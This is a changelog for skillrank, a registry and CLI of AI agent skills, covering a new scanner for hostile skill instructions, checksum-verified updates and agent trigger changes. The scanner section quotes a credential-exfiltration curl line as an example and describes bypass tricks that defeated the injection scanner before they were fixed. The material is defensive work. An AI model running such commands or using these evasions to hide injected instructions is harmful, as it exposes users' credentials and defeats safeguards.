# Changelog

Notable changes to skillrank. The CLI and core library are MIT; the hosted
registry and website are Elastic-2.0. Versions are the git tags on this repo,
and every release publishes signed binaries with a `.sha256` beside each one.

## v0.1.5 — 2026-07-29

The largest release since launch. The catalog got scanned, the updater got
trustworthy, and the agent got a reason to reach for skillrank on its own.

### Skills are scanned now, and the tier means something

Every catalog entry was ingested with a hardcoded `scan_tier: "pending"`, and
the API discarded even that and recomputed it from install status — so all 2,079
skills reported as unscanned. Any client gating on the tier had to warn on the
entire catalog, which trains people to click through the warning and makes the
tier worthless.

A static scanner now reads the instructions an agent would actually follow and
assigns an explainable tier, with findings that name the offending line so a
confirmation can say what is wrong instead of "unverified". Rules are two-factor
by construction — a capability only counts alongside an incriminating target, so
`curl -X POST $YOUR_API` is ordinary and `curl -d "$(cat ~/.aws/credentials)"
https://elsewhere` is not — because single-keyword matching is exactly what
produces warn-on-everything. Rule families cover instruction override, deferred
injection via fetch-then-follow, credential access and egress, remote execution,
destructive commands, safety-control subversion, persistence, supply-chain
redirection, and references to sibling files the content hash does not cover.

**90.5% of the catalog now installs with no confirmation prompt, up from 0%.**

Tiers stay current rather than freezing at whatever the scanner said the day a
skill was pinned: ingest scans new skills, and `rescan.mjs` re-tiers anything
whose verdict predates the current ruleset, wired into the catalog and weekly
refresh workflows.

### The scanner then survived being attacked

A coverage pass ran 25 hostile-but-inert documents through it. It caught 2. The
bypasses were one word long, and the ruleset is public: prefixing a line with
`Rule:`, captioning a fence "Instead of", or registering a domain containing the
word `host`. Underneath was one structural mistake — nine rules returned early on
a whole-line keyword test, so a single incidental English word disabled detection
entirely.

Context gates now demote by a severity step instead of suppressing, input is
canonicalized before matching (zero-width characters dropped, 46 Cyrillic/Greek
homoglyphs folded), and the fence parser is CommonMark-compliant — previously
` ```bash showLineNumbers ` failed to open a fence, so its closing delimiter
opened one and the rest of the document was scanned as code. **Coverage went from
8% to 72%** with no new false positives across a 391-skill legitimate corpus.

Two further bypasses were closed after review: a persistence directive spelled
with Cyrillic lookalikes scored `safe` where its ASCII twin scored `medium`, and
a three-backtick line inside a four-backtick fence closed the block early,
hiding everything after it.

The remaining misses are recorded as `todo` tests naming their technique rather
than deleted. Six need cross-line reasoning a line-at-a-time matcher does not
have, and one is simply written in Spanish — which is the honest ceiling of this
design, and why a tier should be read as triage rather than as a permission
boundary.

### `skillrank update` verifies what it installs

The updater replaced your running binary with unauthenticated bytes: it fetched
the asset, checked only that it was at least 100 KB, then chmod-755'd and renamed
it over the executable. Meanwhile `install.sh` had always fetched the published
`.sha256` and failed closed, and `SECURITY.md` advertised that guarantee.

`apply()` now fetches `{url}.sha256`, hashes the bytes, and refuses on mismatch
**or on any failure to fetch the checksum** — the same fail-closed rule
`install.sh` applies. Related fixes: the API-supplied release tag is validated
before it reaches a download path (a traversal tag resolved to a different GitHub
repo, served under a genuine certificate), both connect and read timeouts are
pinned (`.timeout()` alone was never a ceiling — ureq's 30s connect default takes
precedence), failed lookups back off for an hour instead of retrying every
invocation, and the download is size-capped.

### The CLI tells you when it is out of date

`skillrank update` existed but was reachable only by typing it, so an installed
CLI stayed at whatever version it was installed at, indefinitely.

A check now runs on every invocation and prints one line on stderr when a newer
release exists. It is built so it cannot degrade the command you actually ran:
the hot path is one cached read with no network, the refresh happens after your
output with a hard timeout, it never changes the exit code, it never writes to
stdout (that is where `--json` goes), and it skips `mcp`, `serve`, CI, and
non-terminals. Measured overhead is inside noise. `SKILLRANK_NO_UPDATE_CHECK=1`
turns it off; `SKILLRANK_AUTO_UPDATE=1` applies updates automatically.

### The agent can notice it needs a skill

Every trigger skillrank shipped was written for the wrong actor — the Skill said
"use when *the user* wants to find, choose, install… agent skills", and the MCP
tools said "use when the user asks". An agent that was itself stuck never matched
any of them.

Measured across 3,282 local sessions: the Skill was present in 2,569 and invoked
**zero** times; the MCP tools were available in 2,217 and called three times. The
same transcripts contained the control group — two other user-initiated discovery
skills produced one invocation across ~5,500 exposures, while three situational
skills produced 74. Skills that fire share a shape: a situation plus a temporal
gate.

Triggers are now situational ("before starting work with a tool this agent has no
established approach for, and after the second failed attempt at the same problem
with no new information"), with an explicit negative clause capping it at one
lookup per session. Existing installs pick this up on their next `skillrank
update`, and when that flips someone from user-only to situational it says so and
shows the off switch (`skillrank setup --triggers=user-only`).

Realistic expectation, set by the same data: the best situational skill measured
fires in about 1.5% of sessions. Single-digit percentages are the win here.

### Evals report effort, not just correctness

`duration_ms`, `turns` and `cost_usd` were recorded on every trial and thrown
away at the summary layer, so a skill that cost more tokens but halved the turns
and finished faster read as strictly worse. Most skills do not make an agent
*correct* — with a one-task suite the usual honest outcome is "100% pass in both
arms" — they make it cheaper, faster or better-scoped. Those deltas are now
reported. Cost keeps its own denominator so a partially-priced run is never
reported as misleadingly cheap.

### Also

- `GET /eval-suites` and `GET /skills/facets`. Suite ids were undiscoverable,
  which made local evals unrunnable, and filter vocabularies were guesses that
  matched almost nothing in the real catalog.
- `scan_tier` is a working search filter, so the tier facet narrows results
  instead of returning everything.
- `setup` no longer writes outside a resolved home directory. With `HOME` unset
  it fell back to `.`, so `skillrank update` could rewrite git-tracked files in
  whatever repo you were standing in.
- Backups of `~/.claude.json` and `~/.codex/config.toml` inherit the source
  file's permissions. They were written world-readable regardless of the source
  mode, and those files hold other tools' credentials.
- `install.sh` no longer hides `setup` output, so the primary install path
  discloses what it enabled.

## v0.1.4 — 2026-07-23

`install.sh` installed the binary `0711` instead of `0755`.

## v0.1.3 — 2026-07-23

Fixed the macOS release outage, a leaked MCP child process, and a remote code
execution path in the eval harness: suite-supplied fixture URLs are now
restricted to https/ssh remotes, which blocks git's command-executing `ext::`
transport, local `file://` clones, and option injection through a leading dash.

## v0.1.2 — 2026-07-18

macOS binaries signed and notarized. `install.sh` proves value on install by
scanning the project and recommending skills.

Signing failed on this release — the certificate imported with a mismatched
password — and the workflow now carries two independent guards so a signing
failure can never silently ship a release without assets.

## v0.1.1 — 2026-07-10

Skills install as `skillrank-<name>`, so they are discoverable in a repo's skill
surface. Install-intent counter and optional email capture. A `/how-it-works`
page documenting the eval methodology and scoring. First real eval loaded,
leading with token efficiency.

## v0.1.0 — 2026-07-07

First release. Ported from Go to Rust as a Cargo workspace (core library plus
CLI), with a hosted read-side registry at `api.skillrank.dev`, one-line install
via `curl -fsSL skillrank.dev | sh`, an MCP server and one-command `setup` so
skillrank becomes native agent vocabulary, a bundled `SKILL.md`, and `skillrank
serve` for running a local registry with no hosted backend at all.
